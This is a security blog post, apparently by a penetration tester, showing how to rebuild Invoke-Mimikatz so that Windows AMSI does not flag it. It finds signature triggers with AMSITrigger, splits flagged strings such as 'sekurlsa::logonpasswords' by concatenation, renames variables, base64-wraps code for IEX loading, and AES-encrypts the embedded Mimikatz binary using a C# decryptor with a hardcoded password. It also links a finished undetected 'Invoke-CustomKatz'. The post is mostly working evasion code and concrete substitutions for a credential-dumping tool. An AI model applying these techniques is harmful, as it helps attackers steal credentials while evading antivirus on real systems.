---
title: "Bypass AMSI by manual modification part II - Invoke-Mimikatz"
layout: "post"
---

This blog post will cover some lets say more advanced AMSI triggers. I decided to build a custom Invoke-Mimikatz script without AMSI trigger. I will also cover some information how Invoke-Mimikatz basically works for those who did not know it before.

## Introduction

If you read my last blog post <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Bypass AMSI by manual modification</a> you may have thought about finding triggers for ```Invoke-Mimikatz``` or ```Sharphound``` and build your own version not flagged by AMSI. Well thats a little more complicated because theese tools are flagged by way more different triggers. But it´s still signatures. I will also cover some pitfalls. There is no "new" technique in this blog post, i will simply explain my own procedures and thoughts step by step.

## How is Invoke-Mimikatz working?

If you already know how ```Invoke-Mimikatz``` works just skip this section.

Well i have to admit when i first used ```Invoke-Mimikatz``` or many other offensive security tools i did not take a look at the source code and just used them because they were "trusted by the community". And obviously because when i began working as penetration tester i had no clue of nearly anything. Being a sysadmin before did not help me understand code. One of the first things i do today is taking a look at the code for new tools. In my opinion this is important to prevent unwanted actions on a client and to understand how the magic behind the code actually works.  ```Invoke-Mimikatz``` is not a Mimikatz version written in Powershell. The easiest way to find out how its working is taking a look at the .Notes section:

```text
.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com
``` 

Looks like we first have to take a look at ```Invoke-ReflectivePEInjection``` by Joe Bialek to unterstand whats happening here. The last supported version was located in the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Powersploit</a> repository but ```Powersploit``` did not get support for almost over two years now:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/UnsupportedPowersploit.JPG" width="400" height="400">
</p>

I won´t go through all 2884 lines of Code because this would take a blog post for itself. So to get a brief description we will first look at the description again:

```text
This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

```

Like the function name says ```Invoke-ReflectivePEInjection``` loads an portable executable (PE) file or DLL into the current or remote process memory and executes this file in memory. There are plenty more blog posts about Reflective PE Injection and thats not the main topic here so you can read more about the technique for example <a href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes">here</a>.

Just a hint if you want to play a little bit with ```Invoke-ReflectivePEInjection``` to load other binaries than Mimikatz - the ```Powersploit``` version is broken, but you can use the code from this <a href="https://github.com/PowerShellMafia/PowerSploit/pull/289">pull request</a>.

If we compare ```Invoke-Mimikatz``` and ```Invoke-ReflectivePEInjection``` we will see that the main base of the code is the same. Win32Types, Win32Constants, Win32Functions, helper functions, Invoke-CreateRemoteThread, PE-Info functions and many more are the same. To have the most up to date ```Invoke-Mimikatz``` version you can take a look at the <a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">nishang</a> or <a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1">BC-Security Empire</a> repositories. The interesting part is the Main function of ```Invoke-Mimikatz```:

```batch
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"


    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $ExeArgs = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...snip...]iDCMMJAwlDAAAAAAAAAAAAAAAAAAAAAAAAA='
    $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...snip...]iDCMMJAwlDAAAAAAAAAAAAAAAAAAAAAAAAA='

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}
```

```Invoke-Mimikatz``` basically **is** ```Invoke-ReflectivePEInjection``` - with the Mimikatz executable base64 encoded in a variable being reflectively loaded. There are also new parameters and slight changes at some functions but basically it´s not much more.

So if we want to have ```Invoke-Mimikatz``` not getting caught by AMSI we first have to find the triggers for ```Invoke-ReflectivePEInjection```.
 
## Find triggers for Invoke-ReflectivePEInjection

To find the main triggers for ```Invoke-ReflectivePEInjection``` we will use <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> again. But at first we have to remove all comments like we did in the last blog post and change the function name ```Invoke-ReflectivePEInjection``` to something else like ```PE-Reflect``` because Windows Defender has serious problems with this name:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/PEReflect.JPG">
</p>

By running AMSITrigger we get the following results back:

```
[+] "Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect"
[+] "Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory"
[+] ".CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0"
[+] ".FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
                {
                        $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                        if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
                        {
                                Throw "VoidFunc couldn't be found in the DLL"
                        }
                        $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
                        $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
                        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
                }
                if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
                {
                        Invoke-MemoryFreeLibrary -PEHandle $PEHandle
                }
                else
                {
                        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
                        if ($Success -eq $false)
                        {
                                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
                        }
                }
                Write-Verbose "Done!"
        }
        Main
}
Function Main
{
        if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
        {
                $DebugPreference  = "Continue"
        }
        Write-Verbose "PowerShell ProcessID: $PID"
        $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }
        if (-not $DoNotZeroMZ) {
                $PEBytes[0] = 0
                $PEBytes[1] = 0
        }
        if ($ExeArgs -ne $null -and $ExeArgs -ne '')
        {
                $ExeArgs = "ReflectiveExe $ExeArgs"
        }
        else
        {
                $ExeArgs = "ReflectiveExe"
        }
        if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
        {
                Invoke-Command -ScriptBlock $"
```
So let´s change the signature of the triggers one by one.  

```batch
Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
``` 
is getting replaced with 
```batch
Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Pro'+'te'+'ct') -Value $VirtualProtect
```

```batch
Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
```
is replaced with
```batch
Add-Member -MemberType $('No'+'te'+'Pr'+'op'+'er'+'ty') -Name $('Wr'+'ite'+'Proc'+'ess'+'Mem'+'or'+'y') -Value $WriteProcessMemory
```
For the next trigger we change some variable names:

<table style="width:100%">
  <tr>
    <th>Originalvalue</th>
    <th>NewValue</th>
  </tr>
  <tr>
    <td>$ProcessHandle</td>
    <td>$ProcHandle</td>
  </tr>
  <tr>
    <td>$StartAddress</td>
    <td>$FirstAddress</td>
  </tr>
  <tr> 
    <td>-ProcessHandle</td>
    <td>-ProcHandle</td>
  </tr> 
  <tr> 
    <td>-StartAddress</td>
    <td>-FirstAddress</td>
  </tr> 

</table>

```$ProcessHandle``` and ```$StartAddress``` are parameter values. They are also used with ```-``` so to leave the script functional we also have to replace them.

For the last trigger it´s enough to replace the line
```batch
.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
```

with

```batch
FileType -ieq $('D'+'L'+'L')) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
```

Now AMSITrigger is not finding any more triggers, but the script is still detected by AMSI: 

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/StillDetect.JPG">
</p>

To unterstand this we need to take a look at the AMSITrigger code. The important code is located in the <a href="https://github.com/RythmStick/AMSITrigger/blob/master/AMSITrigger/Triggers.cs">Triggers.cs</a> file. At first all bytes of the script - which has to be analyzed -  are stored in the variable ```bigSample```. Afterwards this variable is checked for AMSI triggers with the function ```scanBuffer```:

```batch
            result = scanBuffer(bigSample, amsiContext);
            if (result != AMSI_RESULT.AMSI_RESULT_DETECTED)
            {
                Console.WriteLine(string.Format("[+] {0}", result));
                return;
            }
```
If the script has a trigger it will continue to search for the specific location. If not it will exit. Important - there is a variable ```chunksize``` which is assigned with the default value ```4096```. AMSITrigger goes through the script in chunks of 4096 byte. Every 4096 byte parts of the script are passed to the amsiscanBuffer for analysis:

```batch
            while (startIndex + chunkSize < bigSample.Length)
            {
                chunkSample = new byte[chunkSize];
                Array.Copy(bigSample, startIndex, chunkSample, 0, chunkSize);
                processChunk(chunkSample); // this function calls a scanBuffer function which itself calls the amsi.dll AmsiScanBuffer function
            }
```

If a trigger is detected for a 4096 byte chunk, the exact first and last byte of the trigger are located by removing bytes step by step. If we look at the screenshot from AMSITrigger above, we see that ```Invoke-ReflectivePEInjection``` was analyzed with 59 AmsiScanBuffer Calls. Thats 59 parts of the script with 4096 byte length each, the last one is most likely smaller. All those chunks did not contain a trigger. We could now change the ```chunkSize``` variable value to find the missing trigger but i´ll spoiler here this will not be fun for ```Invoke-ReflectivePEInjection``` neither ```Invoke-Mimikatz```. You would need a chunk size bigger than 16000 and the console output is too big so that it crashes.

So we have to manually take a look and split the script in parts to find the trigger. From line 1 up to line 2095 of the <a href="https://gist.github.com/S3cur3Th1sSh1t/17b1ea053a7975be510d6586fc38210f">string replaced script</a> - just before the Main function - there is no trigger. Remove the Main function and try it yourself if you like. The interesting thing is, the Main function itself has no trigger as well. We could now search for the specific string responsible for this regex like trigger and change it. But decided to do it another way now.

The content of the Main function is:

```batch
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	Write-Verbose "PowerShell ProcessID: $PID"
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }
	if (-not $DoNotZeroMZ) {
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}
	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
```

We save this part of the script in a single file and base64 encode it with the following command:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/MainBase64.JPG">
</p>

Everything loaded via ```IEX()``` is scanned by AMSI. But we just found out, that the Main function has no trigger, so we can decode this at runtime and load it via ```IEX()```. To do that we replace the main function content with the following:

```batch
IEX($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("CQBpAGYAIAAoACgAJABQAFMAQwBtAGQAbABlAHQALgBNAHkASQBuAHYAbwBjAGEAdABpAG8AbgAuAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAFsAIgBEAGUAYgB1AGcAIgBdACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAC0AYQBuAGQAIAAkAFAAUwBDAG0AZABsAGUAdAAuAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4AQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAWwAiAEQAZQBiAHUAZwAiAF0ALgBJAHMAUAByAGUAcwBlAG4AdAApACAACQB7ACAACQAJACQARABlAGIAdQBnAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiACAACQB9ACAACQBXAHIAaQB0AGUALQBWAGUAcgBiAG8AcwBlACAAIgBQAG8AdwBlAHIAUwBoAGUAbABsACAAUAByAG8AYwBlAHMAcwBJAEQAOgAgACQAUABJAEQAIgAgAAkAJABlAF8AbQBhAGcAaQBjACAAPQAgACgAJABQAEUAQgB5AHQAZQBzAFsAMAAuAC4AMQBdACAAfAAgACUAIAB7AFsAQwBoAGEAcgBdACAAJABfAH0AKQAgAC0AagBvAGkAbgAgACcAJwAgACAAIAAgACAAaQBmACAAKAAkAGUAXwBtAGEAZwBpAGMAIAAtAG4AZQAgACcATQBaACcAKQAgACAAIAAgACAAewAgACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAnAFAARQAgAGkAcwAgAG4AbwB0ACAAYQAgAHYAYQBsAGkAZAAgAFAARQAgAGYAaQBsAGUALgAnACAAIAAgACAAIAB9ACAACQBpAGYAIAAoAC0AbgBvAHQAIAAkAEQAbwBOAG8AdABaAGUAcgBvAE0AWgApACAAewAgAAkACQAkAFAARQBCAHkAdABlAHMAWwAwAF0AIAA9ACAAMAAgAAkACQAkAFAARQBCAHkAdABlAHMAWwAxAF0AIAA9ACAAMAAgAAkAfQAgAAkAaQBmACAAKAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgAC0AYQBuAGQAIAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACcAJwApACAACQB7ACAACQAJACQARQB4AGUAQQByAGcAcwAgAD0AIAAiAFIAZQBmAGwAZQBjAHQAaQB2AGUARQB4AGUAIAAkAEUAeABlAEEAcgBnAHMAIgAgAAkAfQAgAAkAZQBsAHMAZQAgAAkAewAgAAkACQAkAEUAeABlAEEAcgBnAHMAIAA9ACAAIgBSAGUAZgBsAGUAYwB0AGkAdgBlAEUAeABlACIAIAAJAH0AIAAJAGkAZgAgACgAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAALQBpAG0AYQB0AGMAaAAgACIAXgBcAHMAKgAkACIAKQAgAAkAewAgAAkACQBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAUgBlAG0AbwB0AGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAkAFAARQBCAHkAdABlAHMALAAgACQARgB1AG4AYwBSAGUAdAB1AHIAbgBUAHkAcABlACwAIAAkAFAAcgBvAGMASQBkACwAIAAkAFAAcgBvAGMATgBhAG0AZQAsACQARgBvAHIAYwBlAEEAUwBMAFIAKQAgAAkAfQAgAAkAZQBsAHMAZQAgAAkAewAgAAkACQBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAUgBlAG0AbwB0AGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAkAFAARQBCAHkAdABlAHMALAAgACQARgB1AG4AYwBSAGUAdAB1AHIAbgBUAHkAcABlACwAIAAkAFAAcgBvAGMASQBkACwAIAAkAFAAcgBvAGMATgBhAG0AZQAsACQARgBvAHIAYwBlAEEAUwBMAFIAKQAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAACQB9AA=="))))
```

This results in a ```Invoke-ReflectivePEInjection``` with the function name ```PE-Reflect``` <a href="https://gist.github.com/S3cur3Th1sSh1t/1bd87a34c2f84fe6695b89ad701f514f">without AMSI trigger</a>. 

We should now be able to do the same with ```Invoke-Mimikatz``` right? There is still one more problem. The base64 encoded Mimikatz binary has several AMSI triggers:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/Base64Mimi.JPG">
</p>

To get around this we have two options:

* Encoding/Encrypting the base64 encoded Mimikatz part
* Building our own custom Mimikatz which has no triggers

I don´t want this blog post to blow up so we will choose the first option here. And because many encoded variants of Mimikatz also contain triggers as of today we will chose the encryption way, i mentioned something about randomness in the last blog post. Randomness is really helpfull against signatures.

How do we actually encrypt that? I will use my <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1">Invoke-SharpEncrypt</a> script which is a powershell version of Cn33liz´s <a href="https://github.com/Cn33liz/p0wnedLoader">p0wnedLoader</a> with minor modifications. To encrypt the ```$PEBytes64``` and ```$PEBytes32``` values they are stored in separate text files on the disk. I also added a ```#```-character at the very beginning of the base64 binary and at the end of it. This is to filter the exact payload after decryption, i had some annoying problems with newlines and spaces. The following command actually encrypts a text file:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/SharpEncrypt.JPG">
</p>

Afterwards i did the same with the x86 version. To decrypt the value at runtime i will use a modified version of <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1">Invoke-Sharploader</a>. We actually dont want to load a Powershell script via ```Assembly.load()``` and we dont need the download part and no AMSI bypass or ETW block here. So i removed all those stuff. The decryption function now looks like this:

```batch
$powerdecrypt = @"
using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.IO.Compression;
namespace powerdecrypt
{

    public class Program
    {
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }

        public static string decrypt(params string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string script = args[0];
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(script);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            Console.WriteLine("-> Returning the originalbytes");

            var str = System.Text.Encoding.UTF8.GetString(originalBytes);
            str = str.Replace(System.Environment.NewLine, "");
            return str;
        }
    }
}
"@

Add-Type -TypeDefinition $powerdecrypt
```

With the above code in our script the decryption can be done via:

```batch
[powerdecrypt.Program]::decrypt($Encyptedscript,"S3cur3Th1sSh1t")
```

Now we have to repeat the same steps we did for ```Invoke-ReflectivePEInjection``` but this time for ```Invoke-Mimikatz```. Remove the comments and replace all mentioned triggers. For ```Invoke-Mimikatz``` we have to replace a little more strings because there are more triggers for parameter names, Mimikatz arguments and so on. We will also replace ```Invoke-Mimikatz``` with ```Invoke-CustomKatz```, 
```text
"sekurlsa::logonpasswords exit"
```
 is replaced with
```text
'se'+'ku'+'rl'+'sa'+'::'+'lo'+'go'+'np'+'asswor'+'ds ex'+'it'
```

```text
Reflection.AssemblyName('ReflectedDelegate')
```
is going to be
```text
Reflection.AssemblyName('Re'+'fl'+'ect'+'edD'+'ele'+'gat'+'e')
```

```text
'powershell_reflective_mimikatz'
```
is changed to
```text
$('po'+'wer'+'she'+'ll_'+'ref'+'lec'+'tiv'+'e_m'+'imi'+'ka'+'tz')
```
Unfortunately i could not find the exact next trigger locations but replacing the following variable names and parameter names in exactly this order gets you around AMSI at the time of writing:

<table style="width:100%">
  <tr>
    <th>Originalvalue</th>
    <th>NewValue</th>
  </tr>
  <tr>
    <td>DumpCreds</td>
    <td>GetCreds</td>
  </tr>
  <tr>
    <td>DumpCerts</td>
    <td>GetCerts</td>
  </tr>
  <tr>
    <td>$RemoteScriptBlock</td>
    <td>$NoLocalScriptBlock</td>
  </tr>
  <tr>
    <td>$PEBytes64</td>
    <td>$PortableExecutableBytes64</td>
  </tr>
  <tr> 
    <td>$PEBytes32</td>
    <td>$PortableExecutableBytes32</td>
  </tr>
  <tr> 
    <td>$PEBytes</td>
    <td>$PortableExecutableBytes</td>
  </tr>
  <tr>
    <td>-PEBytes</td>
    <td>-PortableExecutableBytes</td>
  </tr>

</table>

This results in an ```Invoke-CustomKatz``` version not flagged by AMSI, <a href="https://gist.github.com/S3cur3Th1sSh1t/b33b978ea62a4b0f6ef545f1378512a6">grab it here</a>. The main function now contains the decryption function and the base64 encoded decrypted Mimikatz is located between the two ```#``` characters as mentioned before:

```batch
    Add-Type -TypeDefinition $powerdecrypt
    $DecryptedMimix64 = [powerdecrypt.Program]::decrypt($EncryptedMimix64,"S3cur3Th1sSh1t")
    [String]$findev = [regex]::match($DecryptedMimix64 ,'(?<=#).*?(?=#)').Value
    $findev | out-file C:\temp\mimifiles5.txt -Encoding utf8
    $PortableExecutableBytes64 = $findev
    
    $DecryptedMimix86 = [powerdecrypt.Program]::decrypt($EncryptedMimix86,"S3cur3Th1sSh1t")
    [String]$findev2 = [regex]::match($DecryptedMimix86 ,'(?<=#).*?(?=#)').Value
    $PortableExecutableBytes32 = $findev
```

The commands issued with this script are actually executed fine as you can see:

<p align="center">
          <img src="/assets/posts/2020-09-09-Bypass-AMSI-by-manual-modification-part-II/NoAmsiButInMemoryScan.JPG">
</p>

But what about the "Threats found" alert in the corner? The Powershell process was killed maybe two secconds later by Windows Defender. This is another detection technique - an in memory scanner - triggered after specific API calls are done. In this case we loaded Mimikatz via ```createRemoteThread```. This triggers the scanner so that the not obfuscated Mimikatz was found in memory. You can read more about the in memory scanner function and one way to bypass it <a href="https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/">here</a>.

Sometimes Defender is too late at killing the process so that the credentials are already shown but you have to redirect the output to a file to get it. For other AV-Vendors this version will work perfectly fine, until there are new triggers, which will happen because its public now.  

## Conclusion

If you didn´t know whats behind ```Invoke-Mimikatz``` i hope know you do. We learned how to find more advanced AMSI triggers and that even theese can be bypassed by manual modification without the need of patching ```amsi.dll```. Maybe there will be AV/EDR vendors in the new future which look for ```amsi.dll``` patches to detect attackers. If that´s gonna happen you can use manual modification instead of traditional bypasses.

Using an unobfuscated Mimikatz version like we did here you will also get more likely detected. In the next blog post i will therefore build a custom ```Mimikatz.exe``` by doing source code modifications. If you are also interested in this topic stay tuned.

For questions or feedback you can reach me via the channels linked at the top of the page.  

## Links & Resources

* First blog post - <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a>

* Invoke-ReflectivePEInjection - <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a>

* Reflective PE Injection description - <a href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes">https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes</a>

* BC-Security Invoke-Mimikatz  - <a href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a>

* Invoke-SharpEncrypt - <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1">https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1</a>

* Invoke-Sharploader - <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1">https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1</a>

* p0wedLoader - <a href="https://github.com/Cn33liz/p0wnedLoader">https://github.com/Cn33liz/p0wnedLoader</a>

* Bypass Windows Defender in memory Scanner - <a href="https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/">https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/</a>

* AMSITrigger - <a href="https://github.com/RythmStick/AMSITrigger">https://github.com/RythmStick/AMSITrigger</a>
